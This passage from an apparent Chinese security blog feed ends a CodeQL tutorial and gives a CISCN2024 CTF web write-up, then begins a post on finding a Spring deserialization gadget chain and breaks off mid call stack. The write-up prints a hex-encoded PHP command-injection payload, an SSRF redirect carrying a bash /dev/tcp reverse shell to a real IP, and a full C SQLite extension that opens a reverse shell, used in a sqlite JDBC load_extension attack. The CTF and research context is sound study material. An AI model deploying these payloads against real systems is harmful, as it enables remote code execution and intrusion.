is inefficient, use isEmpty() instead.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8b9b95419c6a0d400e200499bb22c15b.png"></p><p>再例如，创建一个 python 项目的 codeql-database 命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create ./salt-codeql-database --language=python --source-root ./salt-master</span><br></pre></td></tr></table></figure><p>再写入如下 ql 语句，查找函数参数数量大于7的函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Function</span> f</span><br><span class="line"><span class="keyword">where</span> <span class="built_in">count</span>(f.getAnArg()) <span class="operator">&gt;</span> <span class="number">7</span></span><br><span class="line"><span class="keyword">select</span> f</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1badbf9fb56b109f82a2981123d71359.png"></p><h2 id="CodeQL-参考文档"><a href="#CodeQL-参考文档" class="headerlink" title="CodeQL 参考文档"></a>CodeQL 参考文档</h2><ol><li><a href="https://codeql.github.com/docs/codeql-language-guides/codeql-for-java/">codeql for java</a>：在 Java 项目中进行简单的 CodeQL 查询，常用的类都有一些例子，具备参考价值。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/">QL language reference</a> ：QL 查询语言教程，列举了 Predicates、Types 等类的广义用法，比上面的更全面。</li><li><a href="https://codeql.github.com/codeql-standard-libraries/java/">standard librares for java</a> ：有关 codeql for java 的所有类和方法的文档，过于全面。</li><li><a href="https://codeql.github.com/codeql-query-help/java-cwe/">CWE for Java</a> ： 漏洞扫描脚本，包括 JNDI、log4j等，可作为查询编写的参考，在 <code>java-queries/securiy</code> 目录下。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CodeQL-概览&quot;&gt;&lt;a href=&quot;#CodeQL-概览&quot; class=&quot;headerlink&quot; title=&quot;CodeQL 概览&quot;&gt;&lt;/a&gt;CodeQL 概览&lt;/h2&gt;&lt;p&gt;CodeQL是一个静态代码分析引擎，用来给半自动化检查代码中可能存在的漏洞和bug。</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="codeql" scheme="https://jaspersec.top/tags/codeql/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2024 writeup（web部分）</title>
    <link href="https://jaspersec.top/posts/3286688009.html"/>
    <id>https://jaspersec.top/posts/3286688009.html</id>
    <published>2024-05-24T16:00:00.000Z</published>
    <updated>2025-03-31T22:09:47.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要复现一下ezjava，jdbc attack还是很有意思的</p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>用php -r 执行php代码，用hex2bin绕过关键字和转义。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php+-r+eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250441957.png" alt="image-20240525044153901"></p><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>生成二维码的接口可以打ssrf，打302跳转进ssrf，参考下面的链接：<br><a href="https://zone.huoxian.cn/d/392-302-ssrfhttp">利用302跳转绕过限制-ssrf仅能使用http协议时 - 火线 Zone-安全攻防社区 (huoxian.cn)</a></p><p>vps上用php -S 0.0.0.0:8080 起一个http服务，写上跳转脚本，利用题目自带的后门反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://127.0.0.1/flag.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%31%36%2e%36%32%2e%33%38%2e%37%31%2f%39%39%39%39%20%30%3e%26%31%22&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);  </span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>利用接口访问vps，利用302跳转反弹shell拿到flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zecvr9tqvox55jeytq8.cloudeci1.ichunqiu.com/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442616.png" alt="image-20240525044216568"></p><h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>getimagesize 那里对$thumb的文件类型有要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430802.png" alt="Pasted image 20240522084222.png" title="wikilink"></p><p>我们加一个图片头绕过一下就好了，这里有点坑，要多加几个<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250442181.png" alt="image-20240525044243126"></p><p>payload区别不大，注意这里text不能重复，不然不会进代码逻辑</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=api&amp;c=api&amp;m=qrcode&amp;text=7777777777777&amp;thumb=http://xx.xx.xx.xx/index.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250443151.png" alt="image-20240525044331116"></p><p>PS：上面的方法在比赛可以过，但是在ctfshow的靶场上是过不了的，复现的师傅注意一下。</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>这题有好几种解法，有db文件缓存、sql注入和AspectJWeaver反序列化写文件，下面用的缓存</p><p>简单说一下整体思路：</p><ol><li>让client访问vps上的rce.so，利用缓存在client的&#x2F;tmp下写文件（文件名可计算）</li><li>再让client访问恶意数据库，触发jdbc attack执行load_extension，加载上面写入的文件实现rce</li></ol><p>首先是JdbcController可以传任意的jdbc bean，即sql配置参数可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JdbcController  </span></span><br><span class="line"><span class="keyword">public</span> ResultBean <span class="title function_">connect</span><span class="params">(<span class="meta">@RequestBody</span> JdbcBean jdbcBean)</span> &#123;    </span><br><span class="line">    <span class="keyword">try</span> &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(Integer.valueOf(<span class="number">1</span>), String.join((CharSequence)<span class="string">&quot;,&quot;</span>, <span class="built_in">this</span>.datasourceServiceImpl.testDatasourceConnectionAble(jdbcBean)));    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">catch</span> (Exception e) &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(Integer.valueOf(<span class="number">0</span>), <span class="string">&quot;\u8fde\u63a5\u5931\u8d25&quot;</span>);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次，在service层会有switch分支，通过传入的type值决定使用不同Driver去链接数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DatasourceServiceImpl  </span></span><br><span class="line"><span class="keyword">switch</span> (jdbcBean.getType()) &#123;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-MYSQL&quot;</span>));    </span><br><span class="line">        <span class="type">MysqlDatasourceConnector</span> <span class="variable">mysqlDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MysqlDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> mysqlDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-POSTGRES&quot;</span>));    </span><br><span class="line">        <span class="type">PostgresDatasourceConnector</span> <span class="variable">postgresDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PostgresDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> postgresDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: &#123;    </span><br><span class="line">        <span class="type">SqliteDatasourceConnector</span> <span class="variable">sqliteDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqliteDatasourceConnector</span>(jdbcBean.getUrl());    </span><br><span class="line">        <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;    </span><br><span class="line">            <span class="keyword">return</span> sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> sqliteDatasourceConnector.getTables();    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: &#123;    </span><br><span class="line">        Class.forName((String)config.get(<span class="string">&quot;JDBC-SQLITE&quot;</span>));    </span><br><span class="line">        <span class="keyword">break</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">default</span>: &#123;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里漏洞点比较明显，在utils的sqlite工具类里，可以发现开了load_extension，说明可以打sqlite jdbc attack，sqlite jdbc attack不像其他可以直接反序列化结合组件rce，sqlite只能执行sql语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SqliteDatasourceConnector  </span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SqliteDatasourceConnector</span><span class="params">(String url)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;    </span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);    </span><br><span class="line">    <span class="type">SQLiteConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQLiteConfig</span>();    </span><br><span class="line">    config.enableLoadExtension(<span class="literal">true</span>);    </span><br><span class="line">    <span class="built_in">this</span>.connection = DriverManager.getConnection(url, config.toProperties());    </span><br><span class="line">    <span class="built_in">this</span>.connection.setAutoCommit(<span class="literal">true</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和mysql的udf提权很像，在可以执行sql命令之后，考虑通过加载.so文件来实现rce</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 编译命令，注意要在linux环境下编译  </span><br><span class="line">gcc -g -fPIC -shared rce.c -o rce.so</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rce.c 反弹shell用的  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>    </span></span><br><span class="line">    </span><br><span class="line">SQLITE_EXTENSION_INIT1    </span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Configuration for the TCP connection */</span>    </span><br><span class="line"><span class="type">int</span> tcp_port = <span class="number">2333</span>;    </span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;116.62.38.71&quot;</span>;    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32    </span></span><br><span class="line">__declspec(dllexport)    </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>    </span></span><br><span class="line"><span class="comment">/**    </span></span><br><span class="line"><span class="comment"> * Initializes the SQLite extension. * * @param db SQLite database pointer * @param pzErrMsg Error message pointer * @param pApi SQLite API routines pointer * @return SQLITE_OK on success */</span><span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(    </span></span><br><span class="line"><span class="params">    sqlite3 *db,    </span></span><br><span class="line"><span class="params">    <span class="type">char</span> **pzErrMsg,    </span></span><br><span class="line"><span class="params">    <span class="type">const</span> sqlite3_api_routines *pApi    </span></span><br><span class="line"><span class="params">)</span> &#123;    </span><br><span class="line">    <span class="type">int</span> rc = SQLITE_OK;    </span><br><span class="line">    SQLITE_EXTENSION_INIT2(pApi);    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Establish a TCP connection and spawn a shell if running in a child process */</span>    </span><br><span class="line">    <span class="type">int</span> fd;    </span><br><span class="line">    <span class="keyword">if</span> ((fork()) &lt;= <span class="number">0</span>) &#123;    </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span>    </span><br><span class="line">        addr.sin_family = AF_INET;    </span><br><span class="line">        addr.sin_port = htons(tcp_port);    </span><br><span class="line">        addr.sin_addr.s_addr = inet_addr(ip);    </span><br><span class="line">    </span><br><span class="line">        fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);    </span><br><span class="line">        <span class="keyword">if</span> (connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) != <span class="number">0</span>) &#123;    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// Exit if connection fails    </span></span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Redirect standard file descriptors to the socket    </span></span><br><span class="line">        dup2(fd, <span class="number">0</span>);    </span><br><span class="line">        dup2(fd, <span class="number">1</span>);    </span><br><span class="line">        dup2(fd, <span class="number">2</span>);    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Execute bash shell    </span></span><br><span class="line">        execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rc;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sqlite jdbc attack运行SQL命令，需要连接到构造好的数据库，构造方法如下：</p><p>使用navicat新建一个exp.db，然后创建一个视图，下面选中部分即为client连接之后执行的sql语句<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430804.png" alt="Pasted image 20240525035351.png" title="wikilink"></p><p>缓存实际上就是对当前sqlite连接的数据库在&#x2F;tmp&#x2F;做一个备份，虽然第一次访问的是rce.so，但是程序仍会保存为.db文件，通过CoreConnection类可以知道缓存命名规则，文件名生成脚本如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> java.net.URL;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cacheFilenameGen</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;    </span><br><span class="line">        Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);    </span><br><span class="line">        <span class="type">String</span> <span class="variable">writeUrl</span> <span class="operator">=</span> <span class="string">&quot;http://xxx/rce.so&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">triggerUrl</span> <span class="operator">=</span> <span class="string">&quot;http://xxx/exp.db&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">tmpDirRemote</span> <span class="operator">=</span> <span class="string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">tmpDirLocal</span> <span class="operator">=</span> <span class="string">&quot;/var/folders/x8/mrcrl0p503nbmvy62sgmtk3m0000gn/T/sqlite-jdbc-tmp-&quot;</span>;    </span><br><span class="line">        <span class="type">String</span> <span class="variable">soFilePlace</span> <span class="operator">=</span> String.format(<span class="string">&quot;sqlite-jdbc-tmp-%d.db&quot;</span>, <span class="keyword">new</span> <span class="title class_">URL</span>(writeUrl).hashCode());    </span><br><span class="line">        System.out.println(soFilePlace);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 rce.so 和 exp.db 放到vps上，依次连接，执行写入缓存、触发SQL语句操作即可。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250435029.png" alt="image-20240525043551966"></p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250436448.png" alt="image-20240525043608391"></p><p>成功反弹shell<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430805.png" alt="Pasted image 20240525042329.png" title="wikilink"></p><p>参考文章：</p><ul><li><a href="https://www.ctfiot.com/117914.html">CVE-2023-32697——sqlite jdbc RCE</a></li><li><a href="https://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/">Jdbc碎碎念三：内存数据库 | m0d9’s blog</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack/#sqlite">JDBC Connection URL Attack | 素十八 — JDBC Connection URL Attack | 素十八 (su18.org)</a></li><li><a href="https://github.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java">su18 jdbc attack github</a></li><li><a href="https://xz.aliyun.com/t/13931">https://xz.aliyun.com/t/13931</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;主要复现一下ezjava，jdbc attack还是很有意思的&lt;/p&gt;
&lt;h2 id=&quot;simple-php&quot;&gt;&lt;a href=&quot;#simp</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="php" scheme="https://jaspersec.top/tags/php/"/>
    
    <category term="jdbc attack" scheme="https://jaspersec.top/tags/jdbc-attack/"/>
    
    <category term="wp" scheme="https://jaspersec.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Spring新入口类触发CC链</title>
    <link href="https://jaspersec.top/posts/3519640587.html"/>
    <id>https://jaspersec.top/posts/3519640587.html</id>
    <published>2024-04-18T16:00:00.000Z</published>
    <updated>2025-03-31T22:09:47.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发于先知社区<br>使用CodeQL在Spring组件里找到新的入口类MimeType，能够触发到LazyMap#get，进而触发CC链<br>简单记录了一下使用codeql挖链子的工作流程，本机环境和依赖：</p><ul><li>jdk 17.0.11</li><li>SpringBoot 3.1.10</li><li>CC 3.2.1</li><li>codeql cli 2.17.0</li></ul><h1 id="CodeQL起手式"><a href="#CodeQL起手式" class="headerlink" title="CodeQL起手式"></a>CodeQL起手式</h1><p>官方文档推荐使用vscode extension来搭建CodeQL环境，简单来说就是下面三个步骤：</p><ul><li>下载CodeQL CLI命令行工具，配置好终端环境变量</li><li>vscode安装CodeQL插件，配置好CodeQL CLI的路径</li><li>下载vscode-codeql-starter工作空间搭好框架，下一步是导入数据库，随便找一个项目java-sec-code，创建数据库命令的命令：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /Users/jasper/Documents/Security/tools/CodeQL/databases/java-sec-code-database --language=java --source-root=/Users/jasper/Documents/Security/java/java-sec-code --command=&quot;mvn clean package&quot;</span><br></pre></td></tr></table></figure><p>点侧栏点CodeQL插件，选Java、导入数据库、运行example.ql，能正常运行输出结果，说明环境正常，开挖<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152109.png" alt="image.png"></p><h1 id="编写查询"><a href="#编写查询" class="headerlink" title="编写查询"></a>编写查询</h1><p>CodeQL基础语法网上很多文章，基本是对着文档翻译的，可以直接从<a href="https://codeql.github.com/docs/writing-codeql-queries/">写查询语句</a>开始往下看，不多赘述<br>下面写一下找链子的流程，首先分析目标：找一个新的入口类，经过调用，能够触发到LazyMap#get<br>那么显然source就是readObject方法，在类中定义成员谓词写限定条件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Source  </span><br><span class="line">class ReadObjectMethod extends <span class="keyword">Method</span> &#123;  </span><br><span class="line">    ReadObjectMethod()&#123;  </span><br><span class="line">        this.getDeclaringType() instanceof Serializable <span class="keyword">and</span>  </span><br><span class="line">        this.isPrivate() <span class="keyword">and</span>  </span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span>   </span><br><span class="line">        this.getReturnType() instanceof VoidType  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再写sink点的限定条件，直接指定LazyMap全类名的get方法即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Sink  </span><br><span class="line">class LazyMapGetMethod extends <span class="keyword">Method</span> &#123;  </span><br><span class="line">    LazyMapGetMethod() &#123;  </span><br><span class="line">        this.getDeclaringType() instanceof Serializable <span class="keyword">and</span>  </span><br><span class="line">        this.isPublic() <span class="keyword">and</span>  </span><br><span class="line">        this.getReturnType() instanceof TypeObject <span class="keyword">and</span>  </span><br><span class="line">        this.hasName(&quot;get&quot;) <span class="keyword">and</span>   </span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;org.apache.commons.collections.map&quot;,&quot;LazyMap&quot;)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下有45条结果，可以看到光MimeType就有几条路径可以调到LazyMap#get，随便找一条验证一下即可<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153402.png" alt="image.png"></p><p>实际上，直接把sink点定到transform也可以找到这条链子，它是可以直接打到ChainedTransformer#transfrom的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052152887.png" alt="image.png"></p><h1 id="链子分析和验证"><a href="#链子分析和验证" class="headerlink" title="链子分析和验证"></a><a href="https://jaspersec.top/2024/05/05/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90%E5%92%8C%E9%AA%8C%E8%AF%81" title="链子分析和验证"></a>链子分析和验证</h1><p>以找到的最简单的路径为例，通过MimeType入口类触发getParameter到LazyMap#get，调用链如下：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405052153403.png" alt="image.png"></p><p>然后拼上CC1-LazyMap后半段，验证链子是否有效，函数调用栈如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">120</span>, InvokerTransformer (org.apache.commons.collections.functors)  </span><br><span class="line">transform:<span class="number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)  </span><br><span class="line"><span class="keyword">get</span>:<span class="number">158</span>, LazyMap (org.apache.commons.collections.map)  </span><br><span class="line">getParameter:<span class="number">328</span>, MimeType (org.springframework.util)  </span><br><span class="line">readObject:<span class="number">677</span>, MimeType 